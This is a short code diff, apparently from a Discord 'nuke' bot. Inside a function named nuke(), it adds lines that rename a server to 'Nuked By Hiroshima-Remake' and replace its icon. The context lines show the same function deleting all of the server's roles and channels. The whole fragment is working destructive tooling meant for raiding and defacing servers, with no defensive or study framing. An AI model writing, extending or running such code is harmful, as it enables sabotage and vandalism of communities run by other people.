@@ -9,6 +9,9 @@ export default async function nuke() {
 
   if (!(await checkPermissions(bot))) return;
 
+  await guild.setName("Nuked By Hiroshima-Remake");
+  await guild.setIcon("https://i.ibb.co/KpWPb7b3/download.jpg");
+
   const deleteRoles = RoleManager.deleteAllRoles(guild);
   const deleteChannels = ChannelManager.deleteAllChannels(guild);
 
